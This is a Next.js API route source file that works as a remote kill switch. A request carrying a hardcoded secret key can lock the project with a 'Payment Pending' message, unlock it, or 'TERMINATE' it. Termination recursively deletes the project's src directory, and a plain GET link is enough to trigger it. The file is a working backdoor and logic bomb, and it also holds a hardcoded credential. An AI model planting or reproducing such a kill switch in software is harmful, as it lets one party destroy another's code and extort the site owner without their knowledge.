import { NextResponse } from 'next/server';
import { setProjectStatus } from '@/lib/project-status';
import fs from 'fs';
import path from 'path';

const SYSTEM_SECRET = "M4ster@305"; 

// Helper function to delete folder
const wipeProject = () => {
  const srcDir = path.join(process.cwd(), 'src');
  if (fs.existsSync(srcDir)) {
    // DANGER: This deletes the entire src directory
    fs.rmSync(srcDir, { recursive: true, force: true });
    return true;
  }
  return false;
};

async function handleAction(key: string | null, action: string | null, message?: string) {
  if (key !== SYSTEM_SECRET) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  if (action === 'LOCK') {
    setProjectStatus('LOCKED', message || "Payment Pending");
    return NextResponse.json({ success: true, message: "Project Locked Successfully" });
  }

  if (action === 'UNLOCK') {
    setProjectStatus('ACTIVE');
    return NextResponse.json({ success: true, message: "Project Unlocked Successfully" });
  }

  if (action === 'TERMINATE') {
    setProjectStatus('TERMINATED', "Project Decommissioned");
    const wiped = wipeProject();
    return NextResponse.json({ 
      success: true, 
      message: wiped ? "Project WIPED. src folder deleted." : "Status changed to TERMINATED, but src folder was already gone." 
    });
  }

  return NextResponse.json({ error: "Invalid Action" }, { status: 400 });
}

// Support for POST (Postman/Tools)
export async function POST(req: Request) {
  try {
    const { key, action, message } = await req.json();
    return await handleAction(key, action, message);
  } catch (error) {
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}

// Support for GET (Browser Link Hit)
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const key = searchParams.get('key');
  const action = searchParams.get('action');
  const message = searchParams.get('message') || undefined;

  return await handleAction(key, action, message);
}
